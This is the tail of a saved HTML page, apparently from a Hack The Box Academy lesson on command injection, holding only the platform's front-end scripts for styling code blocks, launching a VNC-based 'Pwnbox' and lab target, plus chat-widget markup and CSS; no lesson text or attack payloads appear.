            return this.className.match(/\blanguage-/);
        }).each(function () {
            let heading = $(this).prevAll().closest('h4').last().text();

            if (this.className === ' language-shell-session') {
                wrapTerminal(this, heading);
            } else if (this.className === ' language-powershell-session') {
                wrapPSTerminal(this, heading);
            } else if (this.className === ' language-cmd-session') {
                wrapCMDTerminal(this, heading);
            } else if (this.className.startsWith(' language-')) {
                var language = this.className.split('-').pop();
                wrapCodeBlock(this,language);
            }
        });

        wrapBrowser($('.website-screenshot'));
        completeCheck();

        $("span:contains('[!bash!]')").html('<span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span>');
    });

    function completeCheck()
    {
        axios.get('/api/check/complete/1033').then(response => {
            let data = response.data;
            if (data.success === 1) {
                if (data.completed === true) {
                    $('#completeBtn').show();
                }
            }
        });
    }

    function wrapTerminal(element, heading)
    {
        $(element).css('line-height', '0px');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title">${heading}</span>
                </div>
            `);
    }
    function wrapPSTerminal(element, heading)
    {
        $(element).css('background', '#012456').children().css('color','white');
        $(element).css('line-height', '0px');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title">${heading}</span>
                </div>
            `);
    }
    function wrapCMDTerminal(element, heading)
    {
        $(element).css('background', 'black').children().css('color','white');
        $(element).css('line-height', '0px');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <span class="window_title">${heading}</span>
                </div>
            `);
    }
    function wrapCodeBlock(element,lang)
    {
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend('<div class="window_top">Code: <span class="text-success">'+lang+'</div>');
    }
    function wrapBrowserOld(element)
    {
        $(element).css("border", "0px").css("border-radius","0");
        let url = element.data('url');
        $(element).wrap('<div class="window_content"></div>')
            .parent().wrap('<div class="window_container"></div>')
            .prepend(`
                <div class="window_top">
                    <span class="window_dot bg-danger"></span>
                    <span class="window_dot bg-warning"></span>
                    <span class="window_dot bg-success"></span>
                    <input type="text" class="website-screenshot-url" disabled value="${url}">
                    <span class="float-right"><i class="fa fa-home"></i></span>
                </div>
            `);
    }
    function wrapBrowser(element)
    {
        $(element).css("border", "0px").css("border-radius","0");

        $(element).each( function(index,e) {
            let url = $(e).data('url');
            $(e).wrap('<div class="window_content"></div>')
                .parent().wrap('<div class="window_container"></div>')
                .prepend(`
                    <div class="window_top">
                        <span class="mr-2">
                            <i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
                        </span>
                        <input type="text" class="website-screenshot-url" disabled value="${url}">
                        <span class="float-right"><i class="fa fa-bars"></i></span>
                    </div>
                `);
        })
    }
</script>
<script type="module">
    import RFB from '/assets/libs/vnc/core/rfb.js';

    let rfb;
    let sidePreview;
    let desktopName;
    let pwnboxActive = false;

    function connectedToServer(e) {
        status("Connected to " + desktopName);
        $('.fullScreenBtn').show();
        $('.resetInstanceBtn').show();
        $('.terminateInstanceBtn').show();
        $('.extendInstanceBtn').show();
        $('.instanceLoading').hide();
        $('.instanceStart').hide();
        $('.resetInstanceBtn').prop('disabled',false);
        $('.fullScreenBtn').prop('disabled',false);
        $('.extendInstanceBtn').prop('disabled',false);
        $('.terminateInstanceBtn').prop('disabled',false);

        document.querySelector('canvas').addEventListener('focus', (event) => {
            navigator.clipboard.readText()
                .then(text => {
                    writeToClipboard(text);
                })
                .catch(err => {
                    console.log('Something went wrong while accessing clipboard', err);
                })
        });

    }

    function disconnectedFromServer(e) {
        status("Disconnected");
        $('.screenPlaceholder').show();
        stopCountdown();
    }

    function clipboardReceived(e) {
        navigator.clipboard.writeText(e.detail.text)
            .then(() => {
                // Success!
            })
            .catch(err => {
                console.log('Something went wrong while copying to clipboard.', err);
            });
    }

    function updateDesktopName(e) {
        desktopName = e.detail.name;
    }

    function status(text) {
        console.log(text);
        $("#statusText").html(text);
    }

    function readQueryVariable(name) {
        const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
            match = document.location.href.match(re);

        if (match) {
            return decodeURIComponent(match[1]);
        }

        return null;
    }

    function writeToClipboard(text) {
        rfb.clipboardPasteFrom(text);
    }

    let host = '';
    let password = '';
    let countdown = '';
    let targetCountdown = '';
    let url= '';
    let spawnInterval = null;

    function getPwnbox() {
        axios.get('/api/get/pwnbox').then(response => {
            let data = response.data;

            if (spawnInterval !== null && data.instance.action_log !== null) {
                let error = data.instance.action_log.find(log => log.error === true);
                if (error) {
                    $('.resetInstanceBtn').prop('disabled',false);
                    $('.fullScreenBtn').prop('disabled',false);
                    $('.extendInstanceBtn').prop('disabled',false);
                    $('.terminateInstanceBtn').prop('disabled',false);
                    $('.instanceStart').show();
                    $('.instanceLoading').hide();
                    $('.startInstanceBtn').show();

                    clearInterval(spawnInterval);
                    disconnectedFromServer();

                    let errorMessage = `${error.text}. Please contact support.`;
                    toastr["error"](errorMessage, "Error");

                    status(errorMessage);
                    return;
                }
            }

            if (data.success === 1 && data.instance.vnc_password !== null) {
                if (data.instance.action_log.find(log => log.action === 'ready')) {
                    host = 'proxy-uk.htb-cloud.com/bird/' + data.instance.hostname;
                    password = data.instance.vnc_password;
                    $('.lifeLeft').html(data.instance.life_remaining);
                    startCountdown();
                    $('.screenPlaceholder').hide();
                    url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
                    pwnboxActive = true;
                    connect();

                    if (spawnInterval !== null) {
                        clearInterval(spawnInterval);
                    }
                }
            } else {
                $('.screenPlaceholder').show();
            }

        });
    }

        function extendPwnbox() {
        axios.get('/api/extend/pwnbox').then(response => {
            let data = response.data;
            if (data.success === 1) {
                $('.lifeLeft').html(data.instance.life_remaining);
                stopCountdown();
                startCountdown();
                toastr["success"]("Time extended for 60 minutes.", "Success");
            } else {
                toastr["error"](data.message, "Error");
            }

        });
    }
    
    getPwnbox();

    function startCountdown() {
        countdown = setInterval(function() {
            let life = parseInt($('.lifeLeft').html()) -1;
            $('.lifeLeft').html(life)
        }, 60 * 1000);
    }

    function stopCountdown() {
        clearInterval(countdown);
    }

    function terminatePwnbox() {
        $('.resetInstanceBtn').prop('disabled',true);
        $('.terminateInstanceBtn').prop('disabled',true);
        $('.fullScreenBtn').prop('disabled',true);
        $('.extendInstanceBtn').prop('disabled',true);
        $('.instanceStart').hide();

        $('.instanceTerminating').show();

        status('Terminating Interactive Instance...');

        axios.delete('/api/terminate/pwnbox')
            .then(({ data }) => {
                if (data.success === 1) {
                    $('.startInstanceBtn').show();
                    $('.instanceStart').show();
                    $('.instanceTerminating').hide();
                    $('.resetInstanceBtn').hide();
                    $('.terminateInstanceBtn').hide();
                    $('.fullScreenBtn').hide();
                    $('.extendInstanceBtn').hide();

                    pwnboxActive = false;

                    toastr['success']('Instance has been terminated.', 'Success');
                } else {
                    toastr['error'](data.message, 'Error');
                    connect();
                    $('.resetInstanceBtn').prop("disabled", false);
                    $('.fullScreenBtn').prop('disabled',false);
                    $('.extendInstanceBtn').prop('disabled',false);
                    $('.terminateInstanceBtn').prop('disabled',false);
                }
            });
    }

    function startPwnbox() {
        $('.resetInstanceBtn').prop('disabled',true);
        $('.fullScreenBtn').prop('disabled',true);
        $('.extendInstanceBtn').prop('disabled',true);
        $('.terminateInstanceBtn').prop('disabled',true);
        $('.instanceStart').hide();
        $('.instanceLoading').show();
        $('.startInstanceBtn').hide();

        status("Starting Interactive Instance...");

        grecaptcha.ready(function() {
            grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', {action: 'spawnPwnbox'}).then(function(token) {
                if (token) {
                    axios.get('/api/spawn/pwnbox?g-recaptcha-response= '+token).then(response => {
                        let data = response.data;
                        if (data.success === 1) {
                            spawnInterval = setInterval(() => {
                                getPwnbox();
                            }, 2000);
                        } else {
                            if(data.code === 1 || (data.code === 3 && pwnboxActive)) {
                                $('.resetInstanceBtn').prop("disabled", false);
                                $('.fullScreenBtn').prop('disabled',false);
                                $('.extendInstanceBtn').prop('disabled',false);
                                $('.terminateInstanceBtn').prop('disabled',false);
                                connect();

                                if (data.code === 3) {
                                    $('.instanceLoading').hide();
                                    startCountdown();
                                }
                            } else {
                                $('.startInstanceBtn').show();
                                $('.instanceStart').show();
                                $('.instanceLoading').hide();
                            }

                            toastr["error"](data.message, "Error");
                        }

                    });
                } else {
                    $('.resetInstanceBtn').prop('disabled',false);
                    $('.fullScreenBtn').prop('disabled',false);
                    $('.extendInstanceBtn').prop('disabled',false);
                    $('.terminateInstanceBtn').prop('disabled',false);
                    $('.instanceStart').show();
                    $('.instanceLoading').hide();
                    $('.startInstanceBtn').show();
                }
            });
        });
    }

    $('.fullScreenBtn').click(function() {
        window.open(url, "_blank");
    });

    $('.startInstanceBtn').click(function() {
        startPwnbox();
                spawnTarget();
            });

    $('.resetInstanceBtn').click(function() {
        $('.screenPlaceholder').show();
        $('.instanceStart').show();
                sidePreview.disconnect();
        startPwnbox();
    });

    $('.terminateInstanceBtn').click(function() {
        $('.screenPlaceholder').show();
        $('.instanceStart').show();
                sidePreview.disconnect();
        terminatePwnbox();
    });

    $('.extendInstanceBtnClicker').click(function() {
       extendPwnbox();
    });

    $('.resetTargetBtn').click(function(){
        $(this).prop('disabled',true);
                    spawnDocker();
                    });

    function connect() {
        status("Connecting to " + host.split('/')[2] + "...");

        
        sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
            { credentials: { password: password } });

        sidePreview.addEventListener("connect",  connectedToServer);
        sidePreview.addEventListener("disconnect", disconnectedFromServer);

        sidePreview.resizeSession = false;
        sidePreview.viewOnly = true;
        sidePreview.scaleViewport = true;
    }

    $('.target, .targetIp').click(e => {
        if ($('.resetTargetBtn').is(':hidden')) return;
        navigator.clipboard.writeText($(e.target).html())
            .then(() => {
                toastr['success']('Target copied to clipboard', 'Success');
            })
            .catch(err => {
                console.log('Something went wrong while copying to clipboard.', err);
            });
    });

        $('.spawnTargetBtn').click(function() {
        spawnDocker();
    })

    function spawnDocker() {
        $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
        axios.get('/api/spawn/container/1033').then(response => {
            let data = response.data;
            if (data.success === 1) {
                $('.target').html(data.instance.hostname+":"+data.instance.port);
                $('.targetIp').html(data.instance.hostname);
                $('.resetTargetBtn').show();
                $('.resetTargetBtn').prop('disabled',false);
                $('.targetLifeTimeContainer').show();
                $('.targetLifeTime').html(90);
                startTargetCountdown();
            } else {
                toastr["error"]("Target failed to spawn. Please try refreshing the page.", "Error");
                $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target failed to spawn :(');
                $('.resetTargetBtn').prop('disabled',false);
            }
        });
    }
        
    function startTargetCountdown() {
        targetCountdown = setInterval(function() {
            let life = parseInt($('.targetLifeTime').html()) -1;
            $('.targetLifeTime').html(life)
            if (life == 0) {
                $('.targetLifeTimeContainer').hide();
            }
        }, 60 * 1000);
    }
</script>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe frameborder="0" height="60" name="a-n7p9czxdsxl9" role="presentation" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" scrolling="no" src="./Command Injections3_files/anchor.html" title="reCAPTCHA" width="256"></iframe></div><div class="grecaptcha-error"></div><textarea class="g-recaptcha-response" id="g-recaptcha-response-100000" name="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe src="./Command Injections3_files/saved_resource.html" style="display: none;"></iframe></div><div id="torrent-scanner-popup" style="display: none;"></div><img height="1" src="./Command Injections3_files/adsct" style="display: none;" width="1"/><img height="1" src="./Command Injections3_files/adsct(1)" style="display: none;" width="1"/><iframe aria-hidden="true" id="intercom-frame" src="./Command Injections3_files/saved_resource(1).html" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" tabindex="-1" title="Intercom"></iframe><div class="intercom-lightweight-app"><div aria-label="Open Intercom Messenger" aria-live="polite" class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><svg viewbox="0 0 28 32" xmlns="http://www.w3.org/2000/svg"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg viewbox="0 0 16 14" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M.116 4.884l1.768-1.768L8 9.232l6.116-6.116 1.768 1.768L8 12.768.116 4.884z" fill-rule="evenodd"></path></svg></div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    from {
      opacity: 0;
      transform: translateY(20px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    bottom: 20px;
    right: 20px;
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: #85C700;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    animation: intercom-lightweight-app-launcher 250ms ease;
  }

  .intercom-lightweight-app-launcher:focus {
    outline: none;
    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 60px;
    height: 60px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 28px;
    height: 32px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 56px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 36px;
    max-width: 36px;
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg {
    width: 16px;
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms ease-out;
    
        width: 376px;
        height: calc(100% - 120px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 100px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
        border-radius: 8px;
      
  }

  .intercom-lightweight-app-messenger-header {
    height: 75px;
    background: linear-gradient(
      135deg,
      rgb(17, 25, 39) 0%,
      rgb(0, 0, 0) 100%
    );
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>